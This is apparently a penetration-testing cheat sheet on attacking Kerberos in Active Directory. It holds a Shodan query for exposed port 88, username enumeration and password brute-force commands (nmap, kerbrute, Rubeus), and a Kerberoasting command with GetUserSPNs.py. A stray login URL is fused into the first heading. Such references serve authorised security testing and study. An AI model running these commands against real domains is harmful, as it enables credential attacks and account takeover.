https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1670595664&rver=7.3.6962.0&wp=MBI_SSL_SHARED&lc=1033&id=250206&cbcxt=sky&ru=https%3A%2F%2Fonedrive%2Elive%2Ecom%2F%3Fv%3Dphotos%26sc%3D2%26id%3Droot%26qt%3Dallmyphotos%26onThisDay%3Dtrue%26moj%3DonThisDay%26startDate%3D12%252D09%252D2022%26cid%3DBAC84FD3BA87BB54&wreply=https%3A%2F%2Fonedrive%2Elive%2Ecom%2F%3Fv%3Dphotos%26sc%3D2%26id%3Droot%26qt%3Dallmyphotos%26onThisDay%3Dtrue%26moj%3DonThisDay%26startDate%3D12%252D09%252D2022%26cid%3DBAC84FD3BA87BB54## What is Kerberos
```

Kerberos is an authentication protocol that is used to verify the identity of a user or host. This topic contains information about Kerberos authentication in Windows Server 2012 and Windows 8.

Source: https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview

Benefits
**Delegated authentication.**
**Single sign on.**
**Interoperability.**
**More efficient authentication to servers.**
**Mutual authentication.**

```

## Shodan
```
port:88 kerberos
```
## Username bruteforce
```
https://github.com/ropnop/kerbrute

nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='ignite.local',userdb=/root/user.txt 192.168.1.105**



.\Rubeus.exe brute /passwords:password.txt /WIN-S0V7KMTVLD2.ignite.local /outfile:ignite.txt


```

HackTricks Automatic Commands
```
Protocol_Name: Kerberos    #Protocol Abbreviation if there is one.
Port_Number:  88   #Comma separated if there is more than one.
Protocol_Description: AD Domain Authentication         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for Kerberos
  Note: |
    Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.
    Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is the responsability of each service to determine if the user has access to its resources.

    https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88

Entry_2:
  Name: Pre-Creds
  Description: Brute Force to get Usernames
  Command: nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="{Domain_Name}",userdb={Big_Userlist} {IP}

Entry_3:
  Name: With Usernames
  Description: Brute Force with Usernames and Passwords
  Note: consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h

Entry_4:
  Name: With Creds
  Description: Attempt to get a list of user service principal names
  Command: GetUserSPNs.py -request -dc-ip {IP} active.htb/svc_tgs
```

